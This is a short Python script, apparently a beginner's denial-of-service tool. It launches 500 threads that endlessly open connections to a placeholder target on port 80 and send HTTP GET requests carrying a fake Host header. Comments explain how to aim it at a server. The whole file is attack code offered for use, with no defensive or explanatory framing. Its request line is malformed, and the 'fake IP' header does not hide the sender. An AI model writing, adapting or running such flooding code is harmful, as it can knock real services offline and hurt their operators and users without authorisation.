import threading
import socket
ip_adress = 'ipaddress'
target = ip_adress
port = 80
fake_ip = '182.21.20.32'
#function contains a loop that continuously executes the following code.
def attack():
    while True:
        #It creates a socket s using the socket module.
        # This socket will be used to establish a connection to the target server.
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #he target variable should contain the IP address or hostname of the server you want to target,
        # and the port variable should contain the port number for the service you want to connect to.
        s.connect((target,port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'),(target,port))
        s.sendto(("Host: "+ fake_ip + "\r\n\r\n").encode('ascii'),(target,port))
        s.close()
#We need to run the above function in mutliple thread
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
